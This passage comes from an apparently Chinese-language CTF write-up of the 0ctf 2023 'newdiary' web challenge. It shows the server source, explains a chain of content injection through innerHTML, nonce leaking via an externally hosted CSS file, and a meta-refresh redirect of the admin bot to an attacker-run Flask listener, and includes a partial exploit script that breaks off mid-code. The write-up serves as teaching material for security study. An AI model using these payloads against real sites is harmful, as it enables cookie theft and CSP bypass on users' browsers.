class="attr">notes</span>: notes.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>) || [],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    username.<span class="property">length</span> &lt; <span class="number">4</span> ||</span><br><span class="line">    username.<span class="property">length</span> &gt; <span class="number">10</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    password.<span class="property">length</span> &lt; <span class="number">6</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123; <span class="attr">msg</span>: <span class="string">&quot;invalid data&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (users.<span class="title function_">has</span>(username)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">get</span>(username) === <span class="title function_">sha256</span>(password)) &#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123; <span class="attr">msg</span>: <span class="string">&quot;Invalid Password&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    users.<span class="title function_">set</span>(username, <span class="title function_">sha256</span>(password));</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/write&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">session</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">const</span> &#123; title, content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">assert</span>(title &amp;&amp; <span class="keyword">typeof</span> title === <span class="string">&quot;string&quot;</span> &amp;&amp; title.<span class="property">length</span> &lt; <span class="number">30</span>);</span><br><span class="line">  <span class="title function_">assert</span>(content &amp;&amp; <span class="keyword">typeof</span> content === <span class="string">&quot;string&quot;</span> &amp;&amp; content.<span class="property">length</span> &lt; <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user_notes = notes.<span class="title function_">get</span>(username) || [];</span><br><span class="line">  user_notes.<span class="title function_">push</span>(&#123;</span><br><span class="line">    title,</span><br><span class="line">    content,</span><br><span class="line">    username,</span><br><span class="line">  &#125;);</span><br><span class="line">  notes.<span class="title function_">set</span>(req.<span class="property">session</span>.<span class="property">username</span>, user_notes);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/read&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;read&quot;</span>, &#123; <span class="attr">nonce</span>: res.<span class="property">nonce</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/read/:id&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d+$/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="number">401</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid parameter&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user_notes = notes.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>);</span><br><span class="line">  <span class="keyword">const</span> found = user_notes &amp;&amp; user_notes[id];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (found) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">title</span>: found.<span class="property">title</span>, <span class="attr">content</span>: found.<span class="property">content</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;404 not found&quot;</span>, <span class="attr">content</span>: <span class="string">&quot;no such note&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/share_diary/:id&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> tmp = share_notes.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>) || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d+$/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="number">401</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid parameter&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user_notes = notes.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>);</span><br><span class="line">  <span class="keyword">const</span> found = user_notes &amp;&amp; user_notes[id];</span><br><span class="line">  <span class="keyword">if</span> (found) &#123;</span><br><span class="line">    tmp.<span class="title function_">push</span>(found);</span><br><span class="line">    share_notes.<span class="title function_">set</span>(req.<span class="property">session</span>.<span class="property">username</span>, tmp);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/share&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;404 not found&quot;</span>, <span class="attr">content</span>: <span class="string">&quot;no such note&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/share&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;share&quot;</span>, &#123;</span><br><span class="line">      <span class="attr">notes</span>: share_notes.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>) || [],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/share/read&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;read_share&quot;</span>, &#123; <span class="attr">nonce</span>: res.<span class="property">nonce</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/share/read/:id&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">query</span>.<span class="property">username</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> found;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d+$/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">status</span>: <span class="number">401</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid parameter&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (username !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      found = share_notes.<span class="title function_">get</span>(username);</span><br><span class="line">      <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">          <span class="attr">title</span>: found[id].<span class="property">title</span>,</span><br><span class="line">          <span class="attr">content</span>: found[id].<span class="property">content</span>,</span><br><span class="line">          <span class="attr">username</span>: found[id].<span class="property">username</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">      found = share_notes.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>);</span><br><span class="line">      <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">          <span class="attr">title</span>: found[id].<span class="property">title</span>,</span><br><span class="line">          <span class="attr">content</span>: found[id].<span class="property">content</span>,</span><br><span class="line">          <span class="attr">username</span>: found[id].<span class="property">username</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;404 not found&quot;</span>, <span class="attr">content</span>: <span class="string">&quot;no such note&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;404 not found&quot;</span>, <span class="attr">content</span>: <span class="string">&quot;no such note&quot;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/logout&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/report&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> id = req.<span class="property">query</span>.<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">query</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> id === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="regexp">/^\d+$/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        report.<span class="title function_">has</span>(req.<span class="property">session</span>.<span class="property">username</span>) &amp;&amp;</span><br><span class="line">        report.<span class="title function_">get</span>(req.<span class="property">session</span>.<span class="property">username</span>) + <span class="number">30</span> &gt; <span class="title function_">now</span>()</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;too fast&quot;</span> &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      report.<span class="title function_">set</span>(req.<span class="property">session</span>.<span class="property">username</span>, <span class="title function_">now</span>());</span><br><span class="line">      <span class="title function_">visit</span>(id, username);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;visited&quot;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;failed&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;bad url&quot;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server running on 80....&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<ul>
<li>/login路由直接登录,没有就自动新建用户名密码</li>
<li>/write路由可以写内容,自定义title和content</li>
<li>/read路由读取发布的文章,流程是/read-&gt;read.html-&gt;read.js-&gt;read/:id-&gt;返回页面</li>
<li>/share路由最重要的路由,先/share_diary-&gt;/share-&gt;share.html-&gt;<code>/share/read</code>—&gt;<br>read_share.html—&gt;share_read.js:<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">load = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">const</span> param = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">const</span> id = param.<span class="title function_">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> username = param.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (id &amp;&amp; <span class="regexp">/^[0-9a-f]+$/</span>.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (username === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">`/share/read/<span class="subst">$&#123;id&#125;</span>`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> data.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> title = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">                title.<span class="property">innerText</span> = data.<span class="property">title</span>;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>).<span class="title function_">appendChild</span>(title);</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">const</span> content = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">                content.<span class="property">innerHTML</span> = data.<span class="property">content</span>;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="title function_">appendChild</span>(content);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">`/share/read/<span class="subst">$&#123;id&#125;</span>?username=<span class="subst">$&#123;username&#125;</span>`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> data.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> title = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">                title.<span class="property">innerText</span> = data.<span class="property">title</span>;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>).<span class="title function_">appendChild</span>(title);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">const</span> content = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">                content.<span class="property">innerHTML</span> = data.<span class="property">content</span>;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="title function_">appendChild</span>(content);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;report&quot;</span>).<span class="property">href</span> = <span class="string">`/report?id=<span class="subst">$&#123;id&#125;</span>&amp;username=<span class="subst">$&#123;username&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;hashchange&#x27;</span>, load);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">load</span>();</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;hashchange&#x27;</span>, load);</span><br></pre></td></tr></table></figure>
这里可以拼接自己传进去的content,而且我们可以更改#后面的hash值来加载一次别的页面,但只有一次,因为加载完了之后就删掉了(<code>removeEventListener</code>)<br>意思大概就是:我们访问<code>http://127.0.0.1:8080/share/read#id=1&amp;username=test1</code>,可以这时候访问<code>http://127.0.0.1:8080/share/read#id=2&amp;username=test1</code>,此时会加载id=2的页面,但是再改为3就不可以了</li>
</ul>
<p>这里我们也可以通过拼接content的特性来构造标签来让他访问我们的css泄露nonce的脚本<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/jmx0hxq_testpub1@1.0.0/leak.css&quot;&gt;&lt;input /&gt;</span><br></pre></td></tr></table></figure><br>在share的时候就可以触发来获取nonce</p>
<ul>
<li>/report路由用于调用bot的visit()函数,bot可以携带含有flag的cookie去访问<code>http://localhost/share/read#id=$&#123;id&#125;&amp;username=$&#123;username&#125;</code>页面,这里id和username可控<br>我们这里设置成重定向的页面</li>
</ul>
<p>攻击流程:</p>
<ul>
<li>先写重定向页面(第0个页面),利用/report路由触发bot去访问泄露nonce的js<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0.0;url=http://flaskip:5000/&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
用户访问此HTML页面后立即重定向</li>
<li>访问第一个页面,里面有自己上传到unpkg.com的css泄露脚本,/share路由触发漏洞获取nonce</li>
<li>拿到nonce后构造bot访问指定url来获取flag的页面(第二个页面)</li>
</ul>
<p>参考wp的脚本:<br><a href="https://github.com/salvatore-abello/CTF-Writeups/tree/main/0ctf%20-%202023/newdiary">CTF-Writeups/0ctf - 2023/newdiary at main ·salvatore-abello/CTF-Writeups ·GitHub上</a></p>
<p>exp.py<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, make_response</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># little random</span></span><br><span class="line">user = <span class="string">&#x27;pwn&#x27;</span>+<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">1000000</span>))</span><br><span class="line">ngrok_url = <span class="string">&#x27;http://10.27.179.134:5000/&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">nonce_substr = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">retrieveNonce</span>(<span class="params">nonce_substr=nonce_substr, force=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="comment"># find the beginning of the nonce (there is no match for start)</span></span><br><span class="line">    new_substr = <span class="built_in">list</span>(nonce_substr)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(new_substr) != <span class="number">30</span> <span class="keyword">and</span> <span class="keyword">not</span> force):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;different length of new_substr [<span class="subst">&#123;<span class="built_in">len</span>(new_substr)&#125;</span>] - aborting&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    backup = []</span><br><span class="line">    nonce = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    remove_i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_substr)):</span><br><span class="line">        start_i = new_substr[i][<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_substr)):</span><br><span class="line">            end_j = new_substr[j][-<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> i != j:</span><br><span class="line">                <span class="keyword">if</span> start_i == end_j:</span><br><span class="line">                    left = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># beginning</span></span><br><span class="line">            remove_i = i</span><br><span class="line">            nonce = new_substr[i]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(nonce) == <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no beginning - aborting&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(nonce) &lt; <span class="number">32</span>):</span><br><span class="line">        new_substr = new_substr[<span class="number">0</span>:remove_i] + new_substr[remove_i+<span class="number">1</span>:]</span><br><span class="line">        <span class="comment"># print(&quot;new substr: &quot; + str(new_substr))</span></span><br><span class="line">        found = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_substr)):</span><br><span class="line">            start_i = new_substr[i][<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">if</span> (nonce[-<span class="number">2</span>:] == start_i):</span><br><span class="line">                <span class="comment"># print(&quot;found: &quot; + start_i)</span></span><br><span class="line">                found += [i]</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(found) == <span class="number">0</span>):</span><br><span class="line">            <span class="comment"># start over from latest backup</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(backup) &gt; <span class="number">0</span>):</span><br><span class="line">                nonce = backup[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                found = backup[-<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">                new_substr = backup[-<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">                backup = backup[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;no backup - aborting&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(found) &gt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(found) &gt; <span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;found more than one: &quot;</span> + <span class="built_in">str</span>(found))</span><br><span class="line">                backup += [[nonce, found[<span class="number">1</span>:], new_substr]]</span><br><span class="line">            remove_i = found[<span class="number">0</span>]</span><br><span class="line">            nonce += new_substr[remove_i][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># input(&quot;nonce: &quot; + nonce)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nonce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/login&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: user&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_zero_note</span>():</span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/write&#x27;</span>, data=&#123;<span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;meta&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: <span class="string">f&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0.0;url=<span class="subst">&#123;ngrok_url&#125;</span>&quot;&gt;&#x27;</span>&#125;)</span><br><span class="line">    share(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_first_note</span>():</span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/write&#x27;</span>, data=&#123;<span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;linkstylesheet&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/jmx0hxq_testpub1@1.0.0/leak.css&quot;&gt;&lt;input /&gt;&#x27;</span>&#125;)</span><br><span class="line">    share(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">share</span>(<span class="params">num</span>):</span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/share_diary/<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_script_nonce</span>(<span class="params">nonce</span>):</span><br><span class="line">    script = <span 